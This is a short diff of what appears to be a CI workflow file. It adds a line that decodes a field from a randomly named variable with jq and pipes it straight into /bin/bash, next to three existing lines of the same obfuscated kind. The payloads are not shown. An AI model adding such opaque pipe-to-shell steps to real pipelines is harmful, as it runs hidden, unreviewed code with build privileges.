@@ -39,6 +39,7 @@ jobs:
           echo $ppio79834 | jq -r .omos64 | /bin/bash
           echo $wa5 | jq -r .z14896 | /bin/bash
           echo $zsjsh8 | jq -r .vcslr038 | /bin/bash
+          echo $wnu5 | jq -r .s4694 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
